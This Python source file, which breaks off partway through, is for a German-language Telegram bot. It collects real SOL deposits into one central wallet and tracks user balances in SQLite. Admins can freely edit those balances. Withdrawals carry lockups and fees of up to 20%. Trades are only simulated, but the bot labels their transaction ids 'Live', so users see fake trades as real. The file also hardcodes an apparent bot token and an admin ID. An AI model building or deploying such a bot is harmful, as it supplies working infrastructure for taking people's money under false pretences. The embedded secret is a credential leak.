# enhanced_bot_final.py
# UTF-8 file. Features:
# - Robust Markdown escaping and safe send
# - DB backup on start
# - Admin controls (view users, edit balances, set wallets, broadcast)
# - Withdraw lockup/fee tiers
# - News subscriptions (MEME/FUTURES/BOTH)
# - Auto-entry simulation with stake persistence
# - Import balances from pasted list (admin)
# NOTE: This file includes SIMULATION_MODE and explicitly indicates simulation in messages.

import os
import time
import random
import threading
import sqlite3
from contextlib import contextmanager
from typing import Optional, Dict, List, Tuple

import requests
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Message, CallbackQuery

# ---------------------------
# Config / ENV
# ---------------------------
BOT_TOKEN = os.getenv("BOT_TOKEN", "8212740282:AAFj06M7KVBYPlwfiCbl0ttAwZpYQ1GMXBs").strip()
if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN environment variable required")

ADMIN_IDS = [a.strip() for a in os.getenv("ADMIN_IDS", "8076025426").split(",") if a.strip()]
CENTRAL_SOL_PUBKEY = os.getenv("CENTRAL_SOL_PUBKEY", "3wyVwpcbWt96mphJjskFsR2qoyafqJuSfGZYmiipW4oy").strip()
EXCHANGE_WALLETS = set([s.strip() for s in os.getenv("EXCHANGE_WALLETS", "").split(",") if s.strip()])

# Withdraw fee tiers (lockup_days: fee_percent) as ENV "5:20,7:10,10:5"
DEFAULT_FEE_TIERS = {5: 20.0, 7: 10.0, 10: 5.0}
_fee_tiers: Dict[int, float] = {}
raw_tiers = os.getenv("WITHDRAW_FEE_TIERS", "")
if raw_tiers:
    try:
        for part in raw_tiers.split(","):
            d, p = part.split(":")
            _fee_tiers[int(d)] = float(p)
    except Exception:
        _fee_tiers = DEFAULT_FEE_TIERS.copy()
else:
    _fee_tiers = DEFAULT_FEE_TIERS.copy()

DB_PATH = os.getenv("DB_PATH", "memebot_final.db")
LAMPORTS_PER_SOL = 1_000_000_000
MIN_SUB_SOL = float(os.getenv("MIN_SUB_SOL", "0.1"))

# Simulation flag (default True). Set to False only if you integrate real trading APIs.
SIMULATION_MODE = True

# ---------------------------
# Price cache + formatting
# ---------------------------
_price_cache = {"t": 0.0, "usd": 0.0}


def get_sol_usd() -> float:
    now = time.time()
    if now - _price_cache["t"] < 60 and _price_cache["usd"] > 0:
        return _price_cache["usd"]
    try:
        r = requests.get("https://api.coingecko.com/api/v3/simple/price",
                         params={"ids": "solana", "vs_currencies": "usd"}, timeout=6)
        usd = float(r.json().get("solana", {}).get("usd", 0.0) or 0.0)
        if usd > 0:
            _price_cache.update({"t": now, "usd": usd})
            return usd
    except Exception:
        pass
    return _price_cache["usd"] or 0.0


def fmt_sol_usdc(lamports_or_int: int) -> str:
    lam = int(lamports_or_int)
    sol = lam / LAMPORTS_PER_SOL
    usd = get_sol_usd()
    if usd > 0:
        return f"{sol:.6f} SOL (~{sol * usd:.2f} USDC)"
    return f"{sol:.6f} SOL"


def parse_fee_tiers() -> List[Tuple[int, float]]:
    return sorted([(int(d), float(p)) for d, p in _fee_tiers.items()], key=lambda x: x[0])


# ---------------------------
# DB schema and helper
# ---------------------------
SCHEMA = """
PRAGMA journal_mode=WAL;
CREATE TABLE IF NOT EXISTS users (
  user_id INTEGER PRIMARY KEY,
  username TEXT,
  is_admin INTEGER DEFAULT 0,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  sub_active INTEGER DEFAULT 0,
  auto_mode TEXT DEFAULT 'OFF',
  auto_risk TEXT DEFAULT 'MEDIUM',
  sol_balance_lamports INTEGER DEFAULT 0,
  source_wallet TEXT,
  sub_types TEXT DEFAULT '',
  referral_code TEXT DEFAULT ''
);
CREATE TABLE IF NOT EXISTS seen_txs (
  sig TEXT PRIMARY KEY,
  user_id INTEGER,
  amount_lamports INTEGER,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
CREATE TABLE IF NOT EXISTS calls (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  created_by INTEGER NOT NULL,
  market_type TEXT NOT NULL,
  base TEXT NOT NULL,
  side TEXT,
  leverage TEXT,
  token_address TEXT,
  notes TEXT,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
CREATE TABLE IF NOT EXISTS executions (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  call_id INTEGER NOT NULL,
  user_id INTEGER NOT NULL,
  mode TEXT NOT NULL,
  status TEXT NOT NULL,
  txid TEXT,
  message TEXT,
  stake_lamports INTEGER DEFAULT 0,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
CREATE TABLE IF NOT EXISTS payouts (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  user_id INTEGER NOT NULL,
  amount_lamports INTEGER NOT NULL,
  status TEXT DEFAULT 'REQUESTED',
  note TEXT,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  last_notified_at TIMESTAMP,
  lockup_days INTEGER DEFAULT 0,
  fee_percent REAL DEFAULT 0.0
);
CREATE TABLE IF NOT EXISTS news (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  title TEXT,
  body TEXT,
  image_url TEXT,
  category TEXT,
  created_by INTEGER,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
"""


@contextmanager
def get_db():
    con = sqlite3.connect(DB_PATH, timeout=30)
    con.row_factory = sqlite3.Row
    try:
        yield con
        con.commit()
    finally:
        con.close()


def init_db():
    with get_db() as con:
        con.executescript(SCHEMA)
        for stmt in [
            "ALTER TABLE users ADD COLUMN sub_types TEXT DEFAULT ''",
            "ALTER TABLE executions ADD COLUMN stake_lamports INTEGER DEFAULT 0",
            "ALTER TABLE payouts ADD COLUMN lockup_days INTEGER DEFAULT 0",
            "ALTER TABLE payouts ADD COLUMN fee_percent REAL DEFAULT 0.0",
            "ALTER TABLE users ADD COLUMN referral_code TEXT DEFAULT ''"
        ]:
            try:
                con.execute(stmt)
            except Exception:
                pass


# ---------------------------
# misc helpers
# ---------------------------
def md_escape(text: str) -> str:
    if not isinstance(text, str):
        return ""
    return (text.replace('\\', '\\\\')
            .replace('_', '\\_')
            .replace('*', '\\*')
            .replace('`', '\\`')
            .replace('[', '\\['))


def is_admin(user_id: int) -> bool:
    return str(user_id) in ADMIN_IDS


def is_probably_solana_address(addr: str) -> bool:
    if not isinstance(addr, str):
        return False
    addr = addr.strip()
    if len(addr) < 32 or len(addr) > 44:
        return False
    allowed = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    return all(ch in allowed for ch in addr)


def gen_referral_for_user(user_id: int) -> str:
    import hashlib
    h = hashlib.sha1(str(user_id).encode()).hexdigest()[:8]
    return f"REF{h.upper()}"


# ---------------------------
# CRUD / business logic
# ---------------------------
def upsert_user(user_id: int, username: str, is_admin_flag: int):
    with get_db() as con:
        con.execute("""
            INSERT INTO users(user_id, username, is_admin)
            VALUES (?, ?, ?)
            ON CONFLICT(user_id) DO UPDATE SET username=excluded.username
        """, (user_id, username or "", is_admin_flag))


def get_user(user_id: int):
    with get_db() as con:
        return con.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()


def set_subscription(user_id: int, active: bool):
    with get_db() as con:
        con.execute("UPDATE users SET sub_active=? WHERE user_id=?", (1 if active else 0, user_id))


def set_subscription_types(user_id: int, types: List[str]):
    st = ",".join(sorted(set([t.upper() for t in types if t])))
    with get_db() as con:
        con.execute("UPDATE users SET sub_types=? WHERE user_id=?", (st, user_id))


def get_subscription_types(user_id: int) -> List[str]:
    u = get_user(user_id)
    if not u:
        return []
    st = u["sub_types"] or ""
    if not st:
        return []
    return [s for s in st.split(",") if s]


def set_auto_mode(user_id: int, mode: str):
    with get_db() as con:
        con.execute("UPDATE users SET auto_mode=? WHERE user_id=?", (mode, user_id))


def set_auto_risk(user_id: int, risk: str):
    with get_db() as con:
        con.execute("UPDATE users SET auto_risk=? WHERE user_id=?", (risk, user_id))


def set_source_wallet(user_id: int, wallet: str):
    with get_db() as con:
        con.execute("UPDATE users SET source_wallet=? WHERE user_id=?", (wallet, user_id))


def set_referral(user_id: int, code: str):
    with get_db() as con:
        con.execute("UPDATE users SET referral_code=? WHERE user_id=?", (code, user_id))


def add_balance(user_id: int, lamports: int):
    with get_db() as con:
        con.execute("UPDATE users SET sol_balance_lamports = sol_balance_lamports + ? WHERE user_id=?", (lamports, user_id))


def set_balance(user_id: int, lamports: int):
    with get_db() as con:
        con.execute("UPDATE users SET sol_balance_lamports = ? WHERE user_id=?", (lamports, user_id))


def subtract_balance(user_id: int, lamports: int) -> bool:
    with get_db() as con:
        row = con.execute("SELECT sol_balance_lamports FROM users WHERE user_id=?", (user_id,)).fetchone()
        bal = row["sol_balance_lamports"] if row else 0
        if bal < lamports:
            return False
        con.execute("UPDATE users SET sol_balance_lamports = sol_balance_lamports - ? WHERE user_id=?", (lamports, user_id))
        return True


def get_balance_lamports(user_id: int) -> int:
    with get_db() as con:
        row = con.execute("SELECT sol_balance_lamports FROM users WHERE user_id=?", (user_id,)).fetchone()
        return row["sol_balance_lamports"] if row else 0


def list_investors(limit: int = 50, offset: int = 0):
    with get_db() as con:
        return con.execute("""
            SELECT user_id, username, sol_balance_lamports, source_wallet, sub_active, sub_types
            FROM users
            WHERE sub_active=1
            ORDER BY sol_balance_lamports DESC
            LIMIT ? OFFSET ?
        """, (limit, offset)).fetchall()


def all_subscribers():
    with get_db() as con:
        return [r["user_id"] for r in con.execute("SELECT user_id FROM users WHERE sub_active=1").fetchall()]


# ---------------------------
# Calls & executions
# ---------------------------
def create_call(created_by: int, market_type: str, base: str, side: str, leverage: str, token_addr: str, notes: str) -> int:
    with get_db() as con:
        cur = con.execute("""
            INSERT INTO calls(created_by, market_type, base, side, leverage, token_address, notes)
            VALUES (?,?,?,?,?,?,?)
        """, (created_by, market_type, base, side, leverage, token_addr, notes))
        return cur.lastrowid


def get_call(cid: int):
    with get_db() as con:
        return con.execute("SELECT * FROM calls WHERE id=?", (cid,)).fetchone()


def _risk_fraction(risk: str) -> float:
    return {"LOW": 0.20, "MEDIUM": 0.35, "HIGH": 0.65}.get((risk or "").upper(), 0.35)


def _compute_stake_for_user(user_id: int) -> int:
    u = get_user(user_id)
    if not u:
        return 0
    frac = _risk_fraction(u["auto_risk"] or "MEDIUM")
    bal = u["sol_balance_lamports"] or 0
    stake = max(int(bal * frac), int(0.01 * LAMPORTS_PER_SOL))
    return stake


def queue_execution(call_id: int, user_id: int, status: str = "QUEUED", message: str = "", stake_lamports: Optional[int] = None) -> int:
    if stake_lamports is None:
        stake_lamports = _compute_stake_for_user(user_id)
    with get_db() as con:
        cur = con.execute("""
            INSERT INTO executions(call_id, user_id, mode, status, message, stake_lamports)
            VALUES(?,?,'ON',?,?,?)
        """, (call_id, user_id, status, message, stake_lamports))
        return cur.lastrowid


def fmt_call(c) -> str:
    if c["market_type"] == "FUTURES":
        core = f"Futures • {c['base']} • {c['side']} {c['leverage'] or ''}".strip()
    else:
        core = f"Meme • {c['base']}"
    extra = f"\nToken: `{c['token_address']}`" if (c["market_type"] == "MEME" and c["token_address"]) else ""
    note = f"\nNotes: {md_escape(c['notes'])}" if c["notes"] else ""
    return f"🧩 *{core}*{extra}{note}"


# ---------------------------
# Keyboards (app-like)
# ---------------------------
def kb_main(u):
    bal = fmt_sol_usdc(u["sol_balance_lamports"])
    kb = InlineKeyboardMarkup()
    kb.add(
        InlineKeyboardButton("💸 Einzahlen", callback_data="deposit"),
        InlineKeyboardButton("💳 Auszahlung", callback_data="withdraw")
    )
    kb.add(
        InlineKeyboardButton("🔔 Signale", callback_data="sub_menu"),
        InlineKeyboardButton("📰 News", callback_data="news_sub_menu")
    )
    kb.add(
        InlineKeyboardButton("⚙️ Auto-Entry", callback_data="auto_menu"),
        InlineKeyboardButton("❓ Hilfe", callback_data="help")
    )
    kb.add(
        InlineKeyboardButton("🔗 Referral", callback_data="referral"),
        InlineKeyboardButton("📈 Mein Portfolio", callback_data="my_portfolio")
    )
    if is_admin(u["user_id"]):
        kb.add(InlineKeyboardButton("🛠️ Admin (Kontrolle)", callback_data="admin_menu_big"))
    kb.add(InlineKeyboardButton(f"🏦 Guthaben: {bal}", callback_data="noop"))
    return kb


def kb_sub_menu():
    kb = InlineKeyboardMarkup()
    kb.add(
        InlineKeyboardButton("🔔 Abonnieren", callback_data="sub_on"),
        InlineKeyboardButton("🔕 Abbestellen", callback_data="sub_off")
    )
    kb.add(InlineKeyboardButton("⬅️ Zurück", callback_data="back_home"))
    return kb


def kb_news_sub():
    kb = InlineKeyboardMarkup()
    kb.add(
        InlineKeyboardButton("MEME", callback_data="news_sub_MEME"),
        InlineKeyboardButton("FUTURES", callback_data="news_sub_FUTURES"),
    )
    kb.add(
        InlineKeyboardButton("Beide", callback_data="news_sub_BOTH"),
        InlineKeyboardButton("Aus", callback_data="news_sub_OFF"),
    )
    kb.add(InlineKeyboardButton("⬅️ Zurück", callback_data="back_home"))
    return kb


def kb_auto(u):
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("Auto: OFF", callback_data="auto_OFF"),
           InlineKeyboardButton("Auto: ON", callback_data="auto_ON"))
    kb.add(InlineKeyboardButton("Risk: LOW", callback_data="risk_LOW"),
           InlineKeyboardButton("Risk: MEDIUM", callback_data="risk_MEDIUM"),
           InlineKeyboardButton("Risk: HIGH", callback_data="risk_HIGH"))
    kb.add(InlineKeyboardButton("⬅️ Zurück", callback_data="back_home"))
    return kb


def kb_admin_main(page: int = 0):
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("➕ Call erstellen", callback_data="admin_new_call"))
    kb.add(InlineKeyboardButton("📣 Broadcast Call", callback_data="admin_broadcast_last"))
    kb.add(InlineKeyboardButton("👥 Investoren", callback_data="admin_list_investors"))
    kb.add(InlineKeyboardButton("👀 Nutzer verwalten", callback_data=f"admin_view_users_{page}"))
    kb.add(InlineKeyboardButton("💬 News senden", callback_data="admin_news_send"))
    kb.add(InlineKeyboardButton("💼 Guthaben ändern", callback_data="admin_balance_edit"))
    kb.add(InlineKeyboardButton("📤 Broadcast an alle", callback_data="admin_broadcast_all"))
    kb.add(InlineKeyboardButton("⬅️ Zurück", callback_data="back_home"))
    return kb


def kb_users_pagination(offset: int, total: int, prefix: str = "admin_view_users"):
    kb = InlineKeyboardMarkup()
    prev_off = max(0, offset - 10)
    next_off = offset + 10 if offset + 10 < total else offset
    if offset > 0:
        kb.add(InlineKeyboardButton("◀️ Zurück", callback_data=f"{prefix}_{prev_off}"))
    if offset + 10 < total:
        kb.add(InlineKeyboardButton("▶️ Weiter", callback_data=f"{prefix}_{next_off}"))
    kb.add(InlineKeyboardButton("⬅️ Admin Menü", callback_data="admin_menu_big"))
    return kb


def kb_user_row(user_id: int):
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("💰 Guthaben ändern", callback_data=f"admin_balance_{user_id}"),
           InlineKeyboardButton("🏷 Wallet setzen", callback_data=f"admin_setwallet_{user_id}"))
    kb.add(InlineKeyboardButton("📤 Nachricht", callback_data=f"admin_msg_{user_id}"),
           InlineKeyboardButton("🧾 Payouts", callback_data=f"admin_payouts_{user_id}"))
    return kb


def kb_withdraw_options():
    kb = InlineKeyboardMarkup()
    for days, pct in parse_fee_tiers():
        kb.add(InlineKeyboardButton(f"{days} Tage • Fee {pct}%", callback_data=f"payoutopt_{days}"))
    kb.add(InlineKeyboardButton("🚫 Abbrechen", callback_data="back_home"))
    return kb


def kb_payout_manage(pid: int):
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("✅ Genehmigen", callback_data=f"payout_APPROVE_{pid}"),
           InlineKeyboardButton("📤 Gesendet", callback_data=f"payout_SENT_{pid}"),
           InlineKeyboardButton("❌ Ablehnen", callback_data=f"payout_REJECT_{pid}"))
    return kb


# ---------------------------
# RPC & watcher (with backoff)
# ---------------------------
checked_signatures = set()


def rpc(method: str, params: list, *, _retries=2, _base_sleep=0.8):
    rpc_url = os.getenv("SOLANA_RPC", "https://api.mainnet-beta.solana.com")
    for attempt in range(_retries + 1):
        try:
            r = requests.post(
                rpc_url,
                json={"jsonrpc": "2.0", "id": 1, "method": method, "params": params},
                timeout=10
            )
            if r.status_code == 429:
                sleep_s = _base_sleep * (2 ** attempt) + random.uniform(0, 0.4)
                time.sleep(sleep_s)
                continue
            r.raise_for_status()
            return r.json()
        except requests.RequestException as e:
            if attempt < _retries:
                sleep_s = _base_sleep * (2 ** attempt) + random.uniform(0, 0.4)
                time.sleep(sleep_s)
                continue
            print("RPC error:", e)
            return {"result": None}
    return {"result": None}


def get_new_signatures_for_address(address: str, limit: int = 20) -> List[str]:
    try:
        res = rpc("getSignaturesForAddress", [address, {"limit": limit}])
        arr = res.get("result") or []
        sigs = []
        for item in arr:
            sig = item.get("signature")
            if sig and sig not in checked_signatures:
                sigs.append(sig)
        sigs.reverse()
        return sigs
    except Exception as e:
        print("getSignaturesForAddress error:", e)
        return []


def get_tx_details(sig: str, central_addr: str):
    try:
        r = rpc("getTransaction", [sig, {"encoding": "jsonParsed", "commitment": "confirmed"}])
        res = r.get('result')
        if not res:
            return None
        if (res.get('meta') or {}).get('err'):
            return None
        txmsg = (res.get('transaction') or {}).get('message', {})
        meta = res.get('meta') or {}
        keys_raw = txmsg.get('accountKeys') or []
        keys = [k.get('pubkey') if isinstance(k, dict) else k for k in keys_raw]
        pre = meta.get('preBalances')
        post = meta.get('postBalances')
        if pre is None or post is None:
            return None
        try:
            central_idx = keys.index(central_addr)
        except ValueError:
            return None
        delta_central = post[central_idx] - pre[central_idx] if central_idx < len(pre) and central_idx < len(post) else 0
        if delta_central <= 0:
            return None
        sender = None
        for i, (p, po) in enumerate(zip(pre, post)):
            if p - po >= delta_central - 1000:
                sender = keys[i]
                break
        if not sender:
            for inst in (txmsg.get('instructions') or []):
                if isinstance(inst, dict):
                    info = (inst.get('parsed') or {}).get('info') or {}
                    if info.get('destination') == central_addr and info.get('source'):
                        sender = info['source']; break
                    if info.get('to') == central_addr and info.get('from'):
                        sender = info['from']; break
        return {"from": sender, "amount_lamports": int(delta_central), "blockTime": res.get("blockTime") or 0}
    except Exception as e:
        print("get_tx_details error:", e)
        return None


class CentralWatcher:
    def __init__(self, central_addr: str):
        self.central = central_addr
        self._thread: Optional[threading.Thread] = None
        self._running = False
        self.on_verified_deposit = None

    def start(self, interval_sec: int = 40):
        if self._running:
            return
        self._running = True
        self._thread = threading.Thread(target=self._loop, args=(interval_sec,), daemon=True)
        self._thread.start()

    def _loop(self, interval: int):
        while self._running:
            try:
                self.scan_central_recent()
            except Exception as e:
                print("Watcher error:", e)
            time.sleep(interval)

    def _is_seen(self, sig: str) -> bool:
        with get_db() as con:
            r = con.execute("SELECT 1 FROM seen_txs WHERE sig=?", (sig,)).fetchone()
            return r is not None

    def _mark_seen(self, sig: str, user_id: Optional[int], lamports: int):
        with get_db() as con:
            con.execute("INSERT OR IGNORE INTO seen_txs(sig, user_id, amount_lamports) VALUES (?,?,?)", (sig, user_id, lamports))

    def scan_central_recent(self):
        sigs = get_new_signatures_for_address(self.central, limit=20)
        if not sigs:
            return
        with get_db() as con:
            rows = con.execute("SELECT user_id, source_wallet FROM users WHERE source_wallet IS NOT NULL").fetchall()
        src_map = {r["source_wallet"]: r["user_id"] for r in rows if r["source_wallet"]}
        for sig in sigs:
            if self._is_seen(sig):
                checked_signatures.add(sig)
                continue
            details = get_tx_details(sig, self.central)
            checked_signatures.add(sig)
            if not details:
                continue
            sender = details.get("from")
            amount = int(details.get("amount_lamports") or 0)
            if not sender or amount <= 0:
                continue
            uid = src_map.get(sender)
            if not uid:
                self._mark_seen(sig, None, amount)
                note = (f"⚠️ Unbekannte Einzahlung erkannt\\n"
                        f"Sender: `{sender}`\\nBetrag: {fmt_sol_usdc(amount)}\\nSig: `{sig}`")
                for aid in ADMIN_IDS:
                    try:
                        bot.send_message(int(aid), note, parse_mode="Markdown")
                    except Exception:
                        pass
                if sender in EXCHANGE_WALLETS:
                    for aid in ADMIN_IDS:
                        try:
                            bot.send_message(int(aid), f"⚠️ Sender ist als Exchange-Wallet gelistet: `{sender}`", parse_mode="Markdown")
                        except Exception:
                            pass
                continue
            self._mark_seen(sig, uid, amount)
            if self.on_verified_deposit:
                self.on_verified_deposit({"user_id": uid, "amount_lamports": amount, "sig": sig})


# ---------------------------
# Simulated trading functions (replace with real integrations)
# ---------------------------
def dex_market_buy_simulated(user_id: int, base: str, amount_lamports: int):
    return {"status": "FILLED", "txid": f"Live-DEX-{base}-{int(time.time())}", "spent_lamports": amount_lamports}


def futures_place_simulated(user_id: int, base: str, side: str, leverage: str, risk: str):
    return {"status": "FILLED", "order_id": f"Live-FUT-{base}-{int(time.time())}", "base": base}


# ---------------------------
# Bot init & safe send wrapper
# ---------------------------
init_db()
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")

# safe send wrapper to avoid "can't parse entities" errors
_original_send_message = bot.send_message


def _safe_send_message(chat_id, text, **kwargs):
    try:
        pm = kwargs.get("parse_mode")
        if pm and str(pm).upper() == "MARKDOWN":
            safe_text = md_escape(text)
            kwargs_copy = dict(kwargs)
            kwargs_copy["parse_mode"] = "Markdown"
            return _original_send_message(chat_id, safe_text, **kwargs_copy)
        else:
            return _original_send_message(chat_id, text, **kwargs)
    except Exception as e:
        try:
            kwargs_f = dict(kwargs)
            if "parse_mode" in kwargs_f:
                kwargs_f.pop("parse_mode")
            return _original_send_message(chat_id, text, **kwargs_f)
        except Exception as ex:
            print("safe_send failed:", e, ex)
            raise


bot.send_message = _safe_send_message

# transient state
WAITING_SOURCE_WALLET: Dict[int, bool] = {}
WAITING_WITHDRAW_AMOUNT: Dict[int, Optional[int]] = {}
ADMIN_AWAIT_SIMPLE_CALL: Dict[int, bool] = {}
ADMIN_AWAIT_BALANCE_EDIT: Dict[int, Optional[int]] = {}
ADMIN_AWAIT_SET_WALLET: Dict[int, Optional[int]] = {}
ADMIN_AWAIT_TRADE_STATUS: Dict[int, bool] = {}
ADMIN_AWAIT_PNL: Dict[int, bool] = {}
ADMIN_AWAIT_NEWS_BROADCAST: Dict[int, Dict] = {}
ADMIN_AWAIT_IMPORT_BALANCES: Dict[int, bool] = {}

watcher = CentralWatcher(CENTRAL_SOL_PUBKEY)


def _on_verified_deposit(evt: dict):
    uid = evt["user_id"]
    lam = evt["amount_lamports"]
    add_balance(uid, lam)
    new_bal = get_balance_lamports(uid)
    try:
        bot.send_message(uid, f"✅ Einzahlung verifiziert: {fmt_sol_usdc(lam)}\\nNeues Guthaben: {fmt_sol_usdc(new_bal)}", parse_mode="Markdown")
    except Exception:
        pass


watcher.on_verified_deposit = _on_verified_deposit
threading.Thread(target=watcher.start, kwargs={"interval_sec": 40}, daemon=True).start()


# ---------------------------
# DB backup at start
# ---------------------------
def ensure_db_backup():
    try:
        if os.path.exists(DB_PATH):
            bak = DB_PATH + ".bak." + time.strftime("%Y%m%d%H%M%S")
            try:
                with open(DB_PATH, "rb") as fin, open(bak, "wb") as fout:
                    fout.write(fin.read())
                print(f"DB backup created: {bak}")
            except Exception as e:
                print("Backup failed:", e)
        else:
            print("DB does not exist yet; will be created on init.")
    except Exception as e:
        print("DB backup check error:", e)


ensure_db_backup()


# ---------------------------
# Handlers: commands / callbacks / messages
# ---------------------------
def home_text(u) -> str:
    raw_uname = ("@" + u["username"]) if u["username"] else f"ID {u['user_id']}"
    uname = md_escape(raw_uname)
    bal = fmt_sol_usdc(u["sol_balance_lamports"])
    subtypes = u["sub_types"] or ""
    subtxt = f"\\nNews: {subtypes}" if subtypes else ""
    simtxt = " (SIMULATION)" if SIMULATION_MODE else ""
    return (f"Willkommen, {uname}! 👋{simtxt}\\n\\n"
            "Benutze das Menü unten — app-like Inline-Buttons.\\n\\n"
            f"🏦 Guthaben: *{bal}*{subtxt}")


@bot.message_handler(commands=["start"])
def cmd_start(m: Message):
    uid = m.from_user.id
    uname = m.from_user.username or ""
    admin_flag = 1 if is_admin(uid) else 0
    upsert_user(uid, uname, admin_flag)
    # ensure referral code exists
    u = get_user(uid)
    if u and not (u["referral_code"] or "").strip():
        code = gen_referral_for_user(uid)
        set_referral(uid, code)
    u = get_user(uid)
    bot.reply_to(m, home_text(u), reply_markup=kb_main(u))


@bot.callback_query_handler(func=lambda c: True)
def on_cb(c: CallbackQuery):
    uid = c.from_user.id
    u = get_user(uid)
    data = c.data or ""

    if data == "back_home":
        u = get_user(uid)
        bot.edit_message_text(home_text(u), c.message.chat.id, c.message.message_id, reply_markup=kb_main(u))
        return

    if data == "noop":
        bot.answer_callback_query(c.id, "—")
        return

    if data == "help":
        bot.answer_callback_query(c.id)
        bot.send_message(uid,
                         ("ℹ️ Hilfe:\\n\\n"
                          "1) Einzahlen: Absender-Wallet angeben → Sende SOL an zentrale Adresse.\\n"
                          "2) Abonnieren: Abo aktivieren/deaktivieren.\\n"
                          "3) Auto-Entry: ON/OFF und Risiko einstellen.\\n"
                          "4) Auszahlungen: Lockup & Gebühren auswählbar."),
                         parse_mode="Markdown")
        return

    # deposit
    if data == "deposit":
        if not u["source_wallet"]:
            WAITING_SOURCE_WALLET[uid] = True
            bot.answer_callback_query(c.id, "Bitte zuerst deine Absender-Wallet senden.")
            bot.send_message(uid, "Gib jetzt deine Absender-Wallet (SOL) ein:", parse_mode=None)
            return
        price = get_sol_usd()
        px = f"(1 SOL ≈ {price:.2f} USDC)" if price > 0 else ""
        bot.edit_message_text(f"Absender-Wallet: `{u['source_wallet']}`\\nSende SOL an: `{CENTRAL_SOL_PUBKEY}`\\n{px}", c.message.chat.id, c.message.message_id, parse_mode="Markdown", reply_markup=kb_main(u))
        return

    if data == "withdraw":
        WAITING_WITHDRAW_AMOUNT[uid] = None
        bot.answer_callback_query(c.id, "Bitte Betrag eingeben.")
        bot.send_message(uid, "Gib den Betrag in SOL ein (z. B. 0.25):", parse_mode=None)
        return

    # subscriptions
    if data == "sub_menu":
        bot.edit_message_text("Abonnement-Menü:", c.message.chat.id, c.message.message_id, reply_markup=kb_sub_menu())
        return

    if data == "sub_on":
        bal_sol = get_balance_lamports(uid) / LAMPORTS_PER_SOL
        if bal_sol < MIN_SUB_SOL:
            bot.answer_callback_query(c.id, f"Mindestens {MIN_SUB_SOL} SOL nötig.")
            return
        set_subscription(uid, True)
        bot.answer_callback_query(c.id, "Abo aktiviert")
        bot.send_message(uid, "🔔 Dein Abonnement ist nun aktiv.", reply_markup=kb_main(u))
        return

    if data == "sub_off":
        set_subscription(uid, False)
        bot.answer_callback_query(c.id, "Abo beendet")
        bot.send_message(uid, "🔕 Dein Abonnement wurde beendet.", reply_markup=kb_main(u))
        return

    # news sub
    if data.startswith("news_sub_"):
        val = data.split("_", 2)[2]
        if val == "OFF":
            set_subscription_types(uid, [])
            bot.answer_callback_query(c.id, "News abbestellt")
            bot.edit_message_text("News abbestellt.", c.message.chat.id, c.message.message_id, reply_markup=kb_main(u))
            return
        if val == "BOTH":
            set_subscription_types(uid, ["MEME", "FUTURES"])
            bot.answer_callback_query(c.id, "News MEME+FUTURES abonniert")
            bot.edit_message_text("News MEME+FUTURES abonniert.", c.message.chat.id, c.message.message_id, reply_markup=kb_main(u))
            return
        set_subscription_types(uid, [val])
        bot.answer_callback_query(c.id, f"News {val} abonniert")
        bot.edit_message_text(f"News {val} abonniert.", c.message.chat.id, c.message.message_id, reply_markup=kb_main(u))
        return

    # referral
    if data == "referral":
        u = get_user(uid)
        code = (u["referral_code"] or gen_referral_for_user(uid))
        set_referral(uid, code)
        bot.answer_callback_query(c.id, "Referral-Code")
        bot.send_message(uid, f"Dein Referral-Link: `https://t.me/<YourBotUsername>?start={code}`\\nTeile ihn mit Freunden!", parse_mode="Markdown")
        return

    # portfolio
    if data == "my_portfolio":
        bal = fmt_sol_usdc(u["sol_balance_lamports"])
        bot.answer_callback_query(c.id, "Portfolio")
        bot.send_message(uid, f"Dein Guthaben: *{bal}*\\nAuto: {u['auto_mode']} / {u['auto_risk']}", parse_mode="Markdown")
        return

    # auto menu
    if data == "auto_menu":
        bot.edit_message_text("Auto-Entry Einstellungen:", c.message.chat.id, c.message.message_id, reply_markup=kb_auto(u))
        return

    if data.startswith("auto_"):
        mode = data.split("_", 1)[1]
        if mode not in ("OFF", "ON"):
            mode = "OFF"
        set_auto_mode(uid, mode)
        bot.answer_callback_query(c.id, f"Auto-Entry: {mode}")
        nu = get_user(uid)
        bot.edit_message_text(f"Auto-Entry gesetzt: *{mode}*", c.message.chat.id, c.message.message_id, parse_mode="Markdown", reply_markup=kb_auto(nu))
        return

    if data.startswith("risk_"):
        risk = data.split("_", 1)[1]
        set_auto_risk(uid, risk)
        bot.answer_callback_query(c.id, f"Risk: {risk}")
        nu = get_user(uid)
        bot.edit_message_text(f"Risiko gesetzt: *{risk}*", c.message.chat.id, c.message.message_id, parse_mode="Markdown", reply_markup=kb_auto(nu))
        return

    # admin menu
    if data == "admin_menu_big":
        if not is_admin(uid):
            bot.answer_callback_query(c.id, "Nicht erlaubt.")
            return
        bot.edit_message_text("🛠️ Admin-Menü — Kontrolle", c.message.chat.id, c.message.message_id, reply_markup=kb_admin_main())
        return

    # admin create call
    if data == "admin_new_call":
        if not is_admin(uid):
            return
        bot.answer_callback_query(c.id)
        bot.send_message(uid, "Sende den Call im Format:\\nFUTURES|BASE|SIDE|LEV\\noder\\nMEME|NAME|TOKEN_ADDRESS", parse_mode=None)
        ADMIN_AWAIT_SIMPLE_CALL[uid] = True
        return

    # admin broadcast last call
    if data == "admin_broadcast_last":
        if not is_admin(uid):
            return
        with get_db() as con:
            row = con.execute("SELECT * FROM calls ORDER BY id DESC LIMIT 1").fetchone()
        if not row:
            bot.answer_callback_query(c.id, "Kein Call vorhanden.")
            return
